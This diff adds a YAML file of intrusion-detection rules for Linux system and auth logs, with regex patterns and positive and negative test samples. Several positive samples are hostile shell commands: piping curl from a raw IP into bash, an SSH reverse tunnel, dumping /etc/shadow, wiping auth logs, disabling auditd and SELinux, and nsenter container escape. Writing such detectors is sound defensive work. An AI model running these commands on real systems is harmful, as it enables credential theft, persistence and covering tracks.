@@ -1,0 +1,321 @@
+version: 1
+meta:
+  name: "系统与认证日志（提权、持久化、入侵痕迹）"
+  author: "awdshell"
+  category: system
+
+# 为什么单独一个文件：Web 那批规则查的是 HTTP 载荷，而 sshd / sudo / cron / kernel
+# 这些日志里出现的是**操作痕迹** —— 新增账号、写入密钥、改计划任务、加载内核模块。
+# 两类规则互不适用，按日志类型分流时各跑各的（见 kind.go）。
+#
+# 写规则时的取向：宁可用带 pid 的结构化形态（`useradd[123]:`）去匹配，
+# 也不用裸命令名 —— 否则日志里出现一句 "useradd is a command to add users"
+# 也会被当成入侵。每条都配了负样本守住这一点。
+
+rules:
+
+  - id: SYS-1001
+    severity: high
+    category: privilege
+    message: "新增用户或用户组"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: '(useradd|adduser|groupadd|addgroup)\[\d+\]|new user: name=|new group: name='
+    test:
+      positive:
+        - "Oct 10 11:00:00 host useradd[123]: new user: name=backdoor, UID=0, GID=0, HOME=/root"
+        - "Oct 10 11:00:00 host groupadd[456]: group added to /etc/group: name=wheel"
+      negative:
+        - "useradd is a command to add users on linux"
+        - "Oct 10 11:00:00 host sshd[1]: Accepted publickey for deploy from 10.0.0.5 port 51000 ssh2"
+
+  - id: SYS-1002
+    severity: high
+    category: privilege
+    message: "账号密码被修改"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: '(passwd|chpasswd|chage)\[\d+\]|password changed for|chpasswd: (password|completed)'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host passwd[2001]: pam_unix(passwd:chauthtok): password changed for root"
+        - "Oct 10 11:00:00 host chpasswd[2002]: chpasswd: password for deploy changed"
+      negative:
+        - "please change your password every 90 days"
+        - "Oct 10 11:00:00 host sshd[1]: Failed password for root from 203.0.113.9 port 4000 ssh2"
+
+  - id: SYS-1003
+    severity: high
+    category: privilege
+    message: "账号被加入特权组"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: '(usermod|gpasswd|adduser)\[\d+\][^\n]*(group|sudo|wheel|docker|adm)|usermod[^\n]*-a{0,2}g[^\n]*(sudo|wheel|docker)'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host usermod[333]: add 'deploy' to group 'sudo'"
+        - "Oct 10 11:00:00 host gpasswd[334]: user deploy added by root to group wheel"
+      negative:
+        - "add the user to the wheel group manually if needed"
+        - "Oct 10 11:00:00 host usermod[333]: change user 'deploy' shell to /bin/bash"
+
+  - id: SYS-1004
+    severity: critical
+    category: persistence
+    message: "SSH 授权密钥被写入"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'authorized_keys|authorized_keys2|ssh-copy-id|/root/\.ssh/|/home/[^/\s]+/\.ssh/'
+    test:
+      positive:
+        - "10.0.0.5 - - bash: echo ssh-rsa AAAAB3Nza... >> /root/.ssh/authorized_keys"
+        - "Oct 10 11:00:00 host ssh-copy-id[123]: copied key to /home/deploy/.ssh/authorized_keys"
+      negative:
+        - "read the ssh manual for authorized keys format"
+        - "Oct 10 11:00:00 host systemd[1]: Starting OpenSSH server daemon..."
+
+  - id: SYS-1005
+    severity: high
+    category: persistence
+    message: "计划任务被修改"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'crontab\[\d+\]:[^\n]*(begin|replace|end)|/var/spool/cron|(installing|reloading) new crontab|atd?\[\d+\]: job'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host crontab[500]: (root) REPLACE (root)"
+        - "Oct 10 11:00:00 host crond[501]: (root) RELOAD (/var/spool/cron/root)"
+      negative:
+        - "Oct 10 11:00:00 host CRON[2001]: (root) CMD (/usr/bin/backup.sh)"
+        - "crontab syntax uses five fields followed by the command"
+
+  - id: SYS-1006
+    severity: high
+    category: malware
+    message: "内核模块被加载或内核被污染"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: '(insmod|modprobe)\b|taints? kernel|loading out-of-tree module|module verification failed'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host kernel: [12.3] rootkit: module verification failed: signature missing"
+        - "Oct 10 11:00:00 host insmod[600]: insmod /tmp/rootkit.ko"
+      negative:
+        - "Oct 10 11:00:00 host kernel: [12.3] e1000e: eth0 NIC Link is Up 1000 Mbps"
+        - "load the module after boot if you need it"
+
+  - id: SYS-1007
+    severity: high
+    category: privilege
+    message: "防火墙规则被改动"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'iptables\s+-[a-z]|iptables:[^\n]*(applying|flushing)|nftables?\s+(add|delete|flush)|firewalld[^\n]*(start|stop|reload)|ufw\s+(allow|deny|disable|enable)'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host kernel: iptables: applying firewall rules: OK"
+        - "Oct 10 11:00:00 host bash: iptables -F && iptables -P INPUT ACCEPT"
+      negative:
+        - "the firewall is configured to allow ssh from the office network"
+        - "Oct 10 11:00:00 host systemd[1]: Started firewalld - dynamic firewall daemon."
+
+  - id: SYS-1008
+    severity: critical
+    category: privilege
+    message: "敏感账号文件被访问或改动"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: '/etc/(shadow|gshadow|sudoers|passwd-\b)|cat[^\n]*/etc/shadow|chmod[^\n]*/etc/shadow|(edit|modif)[^\n]*/etc/sudoers'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host bash: cat /etc/shadow > /tmp/dump.txt"
+        - "Oct 10 11:00:00 host visudo[700]: modified /etc/sudoers"
+      negative:
+        - "Oct 10 11:00:00 host systemd[1]: Started Daily apt download activities."
+        - "the shadow file stores password hashes on linux"
+
+  - id: SYS-1009
+    severity: medium
+    category: privilege
+    message: "提权操作（sudo / su）"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'sudo:[\s\S]{0,120}command=|su(\[\d+\])?: pam_unix\(su:session\): session opened for user root|sudo\[\d+\]: pam_unix'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"
+        - "Oct 10 11:00:00 host su[800]: pam_unix(su:session): session opened for user root by deploy(uid=1000)"
+      negative:
+        - "use sudo to run commands with elevated privileges"
+        - "Oct 10 11:00:00 host sshd[1]: Accepted publickey for deploy from 10.0.0.5 port 51000 ssh2"
+
+  - id: SYS-1010
+    severity: high
+    category: malware
+    message: "动态库劫持（LD_PRELOAD）"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'ld_preload|/etc/ld\.so\.preload|ld\.so\.preload'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host bash: export LD_PRELOAD=/tmp/hook.so; ./service"
+        - "Oct 10 11:00:00 host bash: echo /tmp/hook.so >> /etc/ld.so.preload"
+      negative:
+        - "the loader reads shared libraries listed in the config"
+        - "Oct 10 11:00:00 host sshd[1]: Accepted password for root from 10.0.0.5 port 51000 ssh2"
+
+  - id: SYS-1011
+    severity: critical
+    category: persistence
+    message: "日志或历史被人为清理"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: '(rm|shred|truncate|cat /dev/null\s*>)[^\n]*/(var/log|wtmp|btmp|lastlog|secure|auth\.log)|history -c\b|unset histfile|>\s*/var/log/(wtmp|btmp|secure)'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host bash: rm -rf /var/log/auth.log"
+        - "Oct 10 11:00:00 host bash: history -c && unset HISTFILE"
+      negative:
+        - "log rotation removes old files under /var/log automatically"
+        - "Oct 10 11:00:00 host logrotate[900]: rotating /var/log/syslog"
+
+  - id: SYS-1012
+    severity: high
+    category: persistence
+    message: "PAM 认证配置被修改"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: '/etc/pam\.d/|pam_unix[^\n]*configuration|pam\.d/(system-auth|common-auth|sshd)'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host bash: sed -i s/required/sufficient/ /etc/pam.d/sshd"
+        - "Oct 10 11:00:00 host audit[1]: file=/etc/pam.d/common-auth"
+      negative:
+        - "pam modules are configured under /etc/pam.d in modern distributions"
+        - "Oct 10 11:00:00 host sshd[1]: Accepted publickey for deploy from 10.0.0.5 port 51000 ssh2"
+
+  - id: SYS-1013
+    severity: high
+    category: malware
+    message: "强制访问控制被关闭"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'setenforce\s+0|selinux=disabled|selinux:\s*disabled|aa-complain|apparmor[^\n]*(disabled|complain|killed)'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host bash: setenforce 0"
+        - "Oct 10 11:00:00 host kernel: AppArmor: policy for /usr/sbin/nginx: complain mode"
+      negative:
+        - "selinux provides mandatory access control on rhel"
+        - "Oct 10 11:00:00 host systemd[1]: Started AppArmor initialization."
+
+  - id: SYS-1014
+    severity: high
+    category: persistence
+    message: "SSH 服务配置被放宽"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'permitrootlogin\s+(yes|prohibit-password)|permitempty passwords|permitemptypasswords\s+yes|passwordauthentication\s+yes'
+    test:
+      positive:
+        - "Oct 10 11:00:00 host sshd[1]: Set /etc/ssh/sshd_config PermitRootLogin yes"
+        - "Oct 10 11:00:00 host bash: echo PermitEmptyPasswords yes >> /etc/ssh/sshd_config"
+      negative:
+        - "ssh configuration lives in /etc/ssh/sshd_config"
+        - "Oct 10 11:00:00 host sshd[1]: Server listening on 0.0.0.0 port 22."
+
+  - id: SYS-1015
+    severity: high
+    category: privilege
+    message: "容器逃逸 / 特权容器迹象"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'docker\.sock|--privileged\b|/proc/1/root|nsenter[^\n]*-t\s*1\b|cgroup[^\n]*release_agent'
+    test:
+      positive:
+        - "10.0.0.5 - - bash: docker run --privileged -v /:/host alpine"
+        - "10.0.0.5 - - bash: nsenter -t 1 -m -u -i -n -p -- /bin/sh"
+      negative:
+        - "the container image is built from a minimal base"
+        - "10.0.0.5 - - dockerd[1]: Container 3f2a started."
+
+  - id: SYS-1016
+    severity: high
+    category: malware
+    message: "隧道或反向连接工具"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'ssh[^\n]{0,20}-[a-z]*r[a-z]*\s+\d|ngrok\b|frpc?\s|chisel\b|socat[^\n]*(exec|pty)|reGeorg|Stowaway|lcx\b'
+    test:
+      positive:
+        - "10.0.0.5 - - bash: ssh -R 1080:127.0.0.1:22 root@203.0.113.9"
+        - "10.0.0.5 - - bash: ./frpc -c frpc.ini"
+      negative:
+        - "use ssh -L for local port forwarding in the docs"
+        - "10.0.0.5 - - sshd[1]: Accepted publickey for deploy from 10.0.0.5"
+
+  - id: SYS-1017
+    severity: high
+    category: malware
+    message: "安全服务被停用"
+    transforms: [compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: 'systemctl[^\n]*(stop|disable|mask)[^\n]*(auditd|firewalld|apparmor|selinux|rsyslog|fail2ban)|service\s+(auditd|rsyslog)\s+stop'
+    test:
+      positive:
+        - "10.0.0.5 - - bash: systemctl stop auditd"
+        - "10.0.0.5 - - bash: systemctl disable firewalld"
+      negative:
+        - "systemctl restart nginx after deploying the new config"
+        - "10.0.0.5 - - systemd[1]: Stopped target Multi-User System."
+
+  - id: SYS-1018
+    severity: high
+    category: malware
+    message: "从外部地址下载并直接执行"
+    transforms: [urlDecode, urlDecode, compressWhitespace, lowercase]
+    operator:
+      name: regex
+      params:
+        pattern: '(curl|wget)[^\n]{0,120}https?://\d{1,3}(\.\d{1,3}){3}[^\n]{0,80}|(curl|wget)[^\n]{0,160}\|\s*(sh|bash|python|perl)\b'
+    test:
+      positive:
+        - "10.0.0.5 - - bash: curl http://203.0.113.9/x.sh | bash"
+        - "10.0.0.5 - - bash: wget -qO- http://198.51.100.7/payload | sh"
+      negative:
+        - "download the package from the official mirror before installing"
+        - "10.0.0.5 - - bash: curl -s https://api.github.com/repos/x/y | jq .name"
